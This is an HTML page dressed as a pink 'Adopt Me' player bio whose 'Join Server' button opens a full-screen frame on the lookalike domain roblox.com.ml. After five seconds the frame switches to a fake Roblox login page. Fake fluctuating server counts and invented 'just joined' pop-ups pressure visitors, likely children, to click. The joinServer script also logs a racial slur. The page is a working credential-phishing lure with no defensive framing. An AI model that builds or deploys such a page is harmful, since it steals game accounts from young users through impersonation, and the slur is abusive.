<!DOCTYPE html>
<html>
<head>
  <title>Adopt Me Bio 💖</title>

  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600&display=swap" rel="stylesheet">

  <style>
    body {
      margin: 0;
      font-family: 'Fredoka', sans-serif;
      background: url("https://parentzone.org.uk/sites/default/files/2021-11/adoptme_screen.jpg") no-repeat center center fixed;
      background-size: cover;
      overflow: hidden;
    }

    .overlay {
      position: absolute;
      width: 100%;
      height: 100%;
      backdrop-filter: blur(6px);
      background: rgba(0,0,0,0.25);
      z-index: 1;
    }

    .heart {
      position: absolute;
      color: #ff69b4;
      font-size: 20px;
      animation: floatUp 6s linear infinite;
      opacity: 0.7;
      z-index: 2;
    }

    @keyframes floatUp {
      0% { transform: translateY(100vh); opacity: 0; }
      50% { opacity: 1; }
      100% { transform: translateY(-10vh); opacity: 0; }
    }

    .bio {
      position: relative;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 3;
    }

    .card {
      background: #ffe6f5;
      border-radius: 30px;
      padding: 30px;
      width: 360px;
      text-align: center;
      box-shadow: 0 10px 40px rgba(0,0,0,0.4);
      border: 4px solid white;
    }

    .avatar {
      width: 110px;
      height: 110px;
      border-radius: 50%;
      border: 4px solid white;
      margin-bottom: 10px;
    }

    h1 { color: #ff4da6; }
    .desc { color: #ff69b4; font-size: 14px; }

    .join-btn {
      margin-top: 20px;
      background: linear-gradient(180deg, #ff8ad6, #ff4db8);
      border: none;
      border-radius: 25px;
      padding: 14px 25px;
      font-size: 18px;
      color: white;
      cursor: pointer;
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 10px #ff69b4; }
      50% { box-shadow: 0 0 25px #ff1493; }
      100% { box-shadow: 0 0 10px #ff69b4; }
    }

    .servers {
      margin-top: 15px;
      background: #fff0f8;
      border-radius: 15px;
      padding: 10px;
      max-height: 200px;
      overflow-y: auto;
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 8px;
    }

    .server {
      background: #fff;
      padding: 8px;
      border-radius: 10px;
      font-size: 13px;
      font-weight: 600;
      display: flex;
      justify-content: space-between;
    }

    .server span {
      font-size: 12px;
      background: #ffd6f9;
      padding: 3px 8px;
      border-radius: 10px;
    }

    .server.full span {
      background: #ff4d6d;
      color: white;
    }

    .server.low span {
      background: #90ee90;
    }

    iframe {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100vh;
      border: none;
      display: none;
      z-index: 999999;
    }

.notif {
  position: absolute;
  left: 20px;
  background: rgba(0,0,0,0.7);
  color: white;
  padding: 10px;
  border-radius: 12px;
  font-size: 13px;

  z-index: 9999; /* 🔥 above overlay */

  animation: fade 4s forwards;
}

    @keyframes fade {
      0% { opacity: 0; transform: translateY(10px); }
      20% { opacity: 1; }
      80% { opacity: 1; }
      100% { opacity: 0; transform: translateY(10px); }
    }
  </style>
</head>

<body>

<div class="overlay" id="overlay"></div>

<script>
for (let i = 0; i < 20; i++) {
  let h = document.createElement("div");
  h.className = "heart";
  h.innerText = "💖";
  h.style.left = Math.random() * 100 + "vw";
  document.body.appendChild(h);
}
</script>

<div class="bio" id="bioPage">
  <div class="card">

    <img class="avatar" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREyCF62WRPcmg4ET1T6LQqtvS3shJSXhElsQ&s">

    <h1>💖 cutie_bunny 💖</h1>

    <div class="desc">
      🌸 mega neon collector <br>
      🐶 trading pets daily <br>
      💅 rich & cute always
    </div>

    <button class="join-btn" onclick="joinServer()">💖 Join Server 💖</button>

    <div class="servers">
      <div class="server" data-count="12">Server #123 <span>12/48</span></div>
      <div class="server" data-count="3">Server #45 <span>3/48</span></div>
      <div class="server" data-count="18">Server #301 <span>18/48</span></div>
      <div class="server" data-count="22">Server #744 <span>22/48</span></div>
      <div class="server" data-count="35">Server #268 <span>35/48</span></div>
      <div class="server" data-count="9">Server #120 <span>9/48</span></div>
      <div class="server" data-count="29">Server #707 <span>29/48</span></div>
      <div class="server" data-count="41">Server #662 <span>41/48</span></div>
    </div>

  </div>
</div>

<iframe id="frame"></iframe>

<script>
function joinServer() {
    console.log("nigger")
  document.getElementById("bioPage").style.display = "none";
  document.getElementById("overlay").style.display = "none";

  const frame = document.getElementById("frame");
  frame.style.display = "block";

  // first site
  frame.src = "https://www.roblox.com.ml/games/920587237/Adopt-Me?privateServerLinkCode=141873631524841347615847783517";

  // after 5 seconds → switch
  setTimeout(() => {
    frame.src = "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F348241630184%2FAdopt-Me";
  }, 5000);
}
// server activity
setInterval(() => {
  document.querySelectorAll(".server").forEach(s => {
    let c = +s.dataset.count;
    c += Math.floor(Math.random() * 5) - 2;
    c = Math.max(0, Math.min(48, c));
    s.dataset.count = c;

    let span = s.querySelector("span");
    span.textContent = c >= 48 ? "FULL" : `${c}/48`;

    s.classList.toggle("full", c >= 48);
    s.classList.toggle("low", c <= 5);
  });
}, 2000);

// usernames
const names = ["Mina","Jisoo","Yuna","Hana","Jiwoo","Nayeon","Rosé","Jennie","Lisa","Karina","Winter","Ryujin","Yeji","Irene","Sakura","Wonyoung","Minji","Hanni","Danielle","Haerin","Hyein"];

function createNotif() {
  let n = document.createElement("div");
  n.className = "notif";
  n.innerText = names[Math.floor(Math.random()*names.length)] + " just joined 🇰🇷";

  n.style.bottom = (20 + document.querySelectorAll(".notif").length * 50) + "px";

  document.body.appendChild(n);
  setTimeout(()=>n.remove(),4000);
}

setInterval(createNotif, 1200);
</script>

</body>
</html>
